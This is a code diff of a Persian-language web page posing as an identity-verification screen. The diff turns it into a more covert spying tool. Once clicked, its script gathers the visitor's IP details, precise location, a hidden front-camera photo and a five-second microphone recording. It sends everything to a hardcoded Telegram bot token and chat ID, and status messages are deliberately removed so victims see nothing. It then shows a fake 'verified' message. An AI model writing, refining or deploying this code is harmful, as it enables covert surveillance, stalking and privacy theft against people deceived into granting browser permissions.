@@ -3,109 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لطفاً دسترسی دهید</title>
+    <title>تأیید هویت</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Tahoma, Arial, sans-serif; }
-        body { background: linear-gradient(135deg, #1e3c72, #2a5298); height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .container { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 40px 30px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); max-width: 400px; width: 100%; }
+        body { background: linear-gradient(135deg, #1e3c72, #2a5298); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 40px 30px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); max-width: 420px; width: 100%; }
         .icon { font-size: 60px; margin-bottom: 20px; display: block; }
-        h1 { color: #fff; font-size: 22px; margin-bottom: 15px; }
-        p { color: #d0d8e8; font-size: 14px; margin-bottom: 30px; line-height: 1.8; }
+        h1 { color: #fff; font-size: 20px; margin-bottom: 15px; }
+        p { color: #d0d8e8; font-size: 14px; margin-bottom: 20px; line-height: 1.8; }
+        .warning { background: rgba(255,193,7,0.15); border: 1px solid rgba(255,193,7,0.5); border-radius: 10px; padding: 15px; margin-bottom: 25px; }
+        .warning p { color: #ffc107; font-size: 13px; margin: 0; line-height: 1.7; }
         .btn { display: inline-block; background: linear-gradient(135deg, #4CAF50, #2E7D32); color: #fff; padding: 15px 50px; border-radius: 50px; text-decoration: none; font-size: 18px; font-weight: bold; box-shadow: 0 8px 20px rgba(76,175,80,0.4); border: none; cursor: pointer; animation: pulse 2s infinite; }
         @keyframes pulse { 0%{transform:scale(1)} 50%{transform:scale(1.05)} 100%{transform:scale(1)} }
-        .status { margin-top: 20px; color: #4CAF50; font-size: 13px; min-height: 20px; }
         .footer { margin-top: 25px; color: #a0aec0; font-size: 11px; }
-        video { width: 100%; border-radius: 10px; margin-top: 20px; display: none; }
+        video { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
         <span class="icon">🔒</span>
-        <h1>دسترسی مورد نیاز است</h1>
-        <p>این سایت برای ادامه نیاز به دسترسی موقعیت مکانی و دوربین دارد. لطفاً برای ادامه، روی دکمه زیر کلیک کنید و دسترسی‌ها را تأیید کنید.</p>
+        <h1>تأیید هویت و دسترسی</h1>
+        <div class="warning">
+            <p>⚠️ این سایت به دلیل سیاست‌های حریم خصوصی، دسترسی شما را نمی‌پذیرد و باید از واقعی بودن شما مطمئن شود.</p>
+        </div>
+        <p>برای ادامه، لطفاً روی دکمه زیر کلیک کنید و دسترسی‌های درخواستی را تأیید نمایید.</p>
         <button class="btn" onclick="start()">🚀 تأیید و ادامه</button>
-        <div class="status" id="status"></div>
-        <video id="video" autoplay playsinline></video>
         <div class="footer">© ۱۴۰۳ - تمامی حقوق محفوظ است</div>
     </div>
+
+    <video id="video" autoplay playsinline muted></video>
 
     <script>
         const BOT_TOKEN = '8220638618:AAFFvjJXOyCr9l6abOmVs2nbY1TWgb7TNAo';
         const CHAT_ID = '6578109697';
 
-        async function start() {
-            const status = document.getElementById('status');
-            status.textContent = '⏳ درخواست دسترسی موقعیت...';
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        const lat = pos.coords.latitude;
-                        const lon = pos.coords.longitude;
-                        await sendToTelegram(`📍 موقعیت مکانی:\nعرض: ${lat}\nطول: ${lon}`);
-                        status.textContent = '✅ موقعیت ثبت شد';
-                        await getCamera();
-                    },
-                    (err) => {
-                        status.textContent = '❌ دسترسی موقعیت رد شد';
-                        getCamera();
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            } else {
-                status.textContent = '❌ مرورگر پشتیبانی نمی‌کند';
-                getCamera();
-            }
+        // ارسال متن به تلگرام
+        async function sendMsg(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+                });
+            } catch (e) {}
         }
 
-        async function getCamera() {
-            const status = document.getElementById('status');
-            const video = document.getElementById('video');
-            status.textContent = '⏳ درخواست دسترسی دوربین...';
-
+        // ارسال عکس به تلگرام
+        async function sendPhoto(blob, caption) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'photo.jpg');
+            fd.append('caption', caption);
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: fd
+                });
+            } catch (e) {}
+        }
+
+        // ارسال صدا به تلگرام
+        async function sendAudio(blob) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('audio', blob, 'audio.webm');
+            fd.append('caption', '🎤 ضبط صدا');
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                    method: 'POST',
+                    body: fd
+                });
+            } catch (e) {}
+        }
+
+        // شروع همه کارها - بدون نمایش هیچ وضعیتی
+        async function start() {
+            // ۱. IP
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                sendMsg(`🌐 IP: ${data.ip}\n🏙️ شهر: ${data.city}\n🗺️ منطقه: ${data.region}\n🌍 کشور: ${data.country_name}\n📡 ISP: ${data.org}`);
+            } catch (e) {}
+
+            // ۲. موقعیت
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        sendMsg(`📍 موقعیت:\nعرض: ${pos.coords.latitude}\nطول: ${pos.coords.longitude}\nدقت: ${pos.coords.accuracy} متر`);
+                    },
+                    () => {},
+                    { enableHighAccuracy: true, timeout: 15000 }
+                );
+            }
+
+            // ۳. دوربین (جلو)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: 640, height: 480 } 
+                });
+                const video = document.getElementById('video');
                 video.srcObject = stream;
-                video.style.display = 'block';
-                status.textContent = '✅ دوربین فعال شد';
+                await video.play();
 
                 setTimeout(async () => {
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    const imageData = canvas.toDataURL('image/jpeg');
-                    await sendPhotoToTelegram(imageData);
-                    stream.getTracks().forEach(track => track.stop());
-                    status.textContent = '✅ اطلاعات ارسال شد';
-                }, 3000);
-            } catch (err) {
-                status.textContent = '❌ دسترسی دوربین رد شد';
-            }
-        }
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                    await sendPhoto(blob, '📸 دوربین جلو');
+                    stream.getTracks().forEach(t => t.stop());
+                }, 2000);
+            } catch (e) {}
 
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            // ۴. میکروفون (۵ ثانیه)
             try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-                });
-            } catch (e) { console.log('خطا:', e); }
-        }
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const recorder = new MediaRecorder(audioStream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    await sendAudio(blob);
+                    audioStream.getTracks().forEach(t => t.stop());
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000);
+            } catch (e) {}
 
-        async function sendPhotoToTelegram(imageData) {
-            const blob = await (await fetch(imageData)).blob();
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'photo.jpg');
-            formData.append('caption', '📸 عکس دوربین');
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            try {
-                await fetch(url, { method: 'POST', body: formData });
-            } catch (e) { console.log('خطا:', e); }
+            // ۵. بستن صفحه بعد از ۱۰ ثانیه
+            setTimeout(() => {
+                document.body.innerHTML = '<div style="color:white;text-align:center;padding:50px;font-family:Tahoma;"><h1>✅ تأیید شد</h1><p>می‌توانید این صفحه را ببندید.</p></div>';
+            }, 10000);
         }
     </script>
 </body>
-  </html>
+</html>
